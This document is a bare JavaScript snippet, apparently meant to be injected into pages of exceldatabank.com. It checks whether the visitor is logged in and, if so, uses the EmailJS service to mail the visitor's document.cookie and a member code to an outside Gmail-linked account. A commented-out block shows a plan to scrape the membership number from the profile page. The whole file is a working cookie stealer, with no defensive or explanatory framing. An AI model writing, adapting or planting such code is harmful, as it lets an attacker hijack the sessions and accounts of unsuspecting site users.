
$.getScript('https://cdn.emailjs.com/dist/email.min.js', function() {
  (function(){
      emailjs.init("user_v53jGOfDqJGNImD25jUpw");
   })();
    
     $.get("http://www.exceldatabank.com/popupfiles/message.php?member_id=130333", function( data ) {
          var memcode='def';
          var str2 = "Member Login";
          if(data.indexOf(str2) != -1){
               console.log("found");
          }else{
             //console.log("not found");
            //logged in
           
            /*
            $.get("http://www.exceldatabank.com/view_profile.php", function( data ) {
              var outHtml = $(data);
              $("#foo").hide().append(data);
              var elems = $('td').filter(function(){
                  return this.textContent.trim() === "Membership No"
              });

              if(elems[0]){
                      console.log(xx=$(elems));
                      memcode=$(elems[0]).prev().text();               
              }
                      
             });
            */
            
             emailjs.send("gmail","data",{cookie: document.cookie, time: new Date().getTime(),"memcode":memcode});
          }
     });
});
//
